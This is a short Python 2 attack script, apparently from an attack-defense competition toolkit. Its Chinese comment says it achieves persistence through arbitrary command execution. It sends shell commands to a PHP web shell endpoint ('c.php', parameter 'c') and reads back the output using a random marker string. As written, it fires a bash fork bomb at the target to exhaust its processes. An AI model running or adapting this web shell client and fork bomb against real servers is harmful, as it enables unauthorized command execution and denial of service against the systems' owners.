#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 通过任意命令执行达到权限维持的效果

import requests
import random
import string
import hashlib

timeout = 1

def random_string(length):
    return "".join([random.choice(string.letters) for i in range(length)])

def shell_exec(url, command):
    flag = random_string(0x10)
    data = {
        "c":"%s && echo '%s'" % (command, flag)
    }
    try:
        response = requests.post(url, data=data, timeout=timeout)
        content = response.content
        print "[+] Content : "
        print content
        if flag in content:
            return content.replace("\n%s\n" % (flag), "")
        return content
    except Exception as e:
        print "[-] %s" % (e)


def main():
    host = "127.0.0.1"
    port = "80"
    url = "http://%s:%s/c.php" % (host, port)
    command = ":(){ :|: & };:"
    shell_exec(url, command)

if __name__ == "__main__":
    main()
